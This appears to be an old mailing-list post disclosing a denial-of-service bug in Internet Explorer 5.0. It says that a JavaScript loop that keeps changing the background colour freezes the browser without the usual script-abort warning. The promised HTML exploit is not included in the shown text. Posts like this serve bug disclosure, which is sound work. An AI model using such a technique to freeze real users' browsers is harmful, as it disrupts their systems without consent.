Subject: Exploit in Internet Explorer 5.0

Hi everyone!


I have found a bug which will freeze Internet Explorer 5.0
I know that there are *many* bugs that will crasch browsers
but what makes this one special is the following:

In IE 5.0 Microsoft has fixed the bugs from IE 4.0 that
was based on infinit loops in JavaScript. If a JavaScript
contains a loop which will cause IE 5.0 to run slowly
or be unresponsive, the user will be warned and he/she will
be prompted whether the JavaScript should be aborted or
not. This exploit is a JavaScript which changes the bgColor in
an infinit loop and when you open it you wont get a warning.
The browser will just freeze!

This is a new exploit which affects Microsoft Internet Explorer 5.0.
When you enter the html document below, IE will freeze and you have to 
close it with ctrl + alt + del.
